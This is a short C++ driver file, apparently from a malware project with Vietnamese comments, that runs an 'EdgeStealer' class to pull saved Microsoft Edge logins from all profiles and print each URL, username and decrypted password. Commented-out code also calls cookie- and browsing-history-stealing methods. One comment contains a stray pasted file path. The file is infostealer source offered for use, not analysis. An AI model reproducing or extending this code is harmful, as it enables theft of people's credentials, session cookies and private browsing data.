#include <iostream>
#include <vector>
#include <string>
#include <tuple>
#include "edge_stealer.h" // Đảm bảo tệp EdgeStealer.h nằm trong cùng thư mục hoặc trong đường dẫn include của trình biên dịch

int main() {
    EdgeStealer stealer; // Tạo một đối tượng EdgeStealer
    std::cout << "Attempting to retrieve Edge passwords from all profiles..." << std::endl;

    // Gọi phương thức StealPasswords để lấy thông tin đăng nhập (bao gồm cả profile)
    std::vector<std::tuple<std::string, std::string, std::string, std::string>> passwords = stealer.StealPasswords();

    if (passwords.empty()) {
        std::cout << "No passwords found or an error occurred." << std::endl;
    }
    else {
        std::cout << "Found " << passwords.size() << " saved credentials:" << std::endl;
        std::cout << "==========================================================" << std::endl;

        for (const auto& cred : passwords) {
            // std::get<0>(cred) là profile name
            // std::get<1>(cred) là origin_url
            // std::get<2>(cred) là username_valued:\Maleware Document\Malware\x64\Debug
            // std::get<3>(cred) là password_value (đã giải mã)
            std::cout << "Profile:  " << std::get<0>(cred) << std::endl;
            std::cout << "URL:      " << std::get<1>(cred) << std::endl;
            std::cout << "Username: " << std::get<2>(cred) << std::endl;
            std::cout << "Password: " << std::get<3>(cred) << std::endl;
            std::cout << "----------------------------------------------------------" << std::endl;
        }
    }

    // Bạn cũng có thể gọi các phương thức khác ở đây để kiểm tra:
    /*
    std::cout << "\nAttempting to retrieve Edge cookies..." << std::endl;
    std::vector<std::tuple<std::string, std::string, std::string>> cookies = stealer.StealCookies();
    if (cookies.empty()) {
        std::cout << "No cookies found or an error occurred." << std::endl;
    } else {
        std::cout << "Found " << cookies.size() << " cookies." << std::endl;
        // In thông tin cookies (cần điều chỉnh cho phù hợp với cấu trúc tuple của StealCookies)
    }

    std::cout << "\nAttempting to retrieve Edge history..." << std::endl;
    std::vector<std::tuple<std::string, std::string, long long>> history = stealer.StealHistory();
    if (history.empty()) {
        std::cout << "No history found or an error occurred." << std::endl;
    } else {
        std::cout << "Found " << history.size() << " history entries." << std::endl;
        // In thông tin lịch sử
    }
    */

    std::cout << "\nTesting complete." << std::endl;
    return 0;
}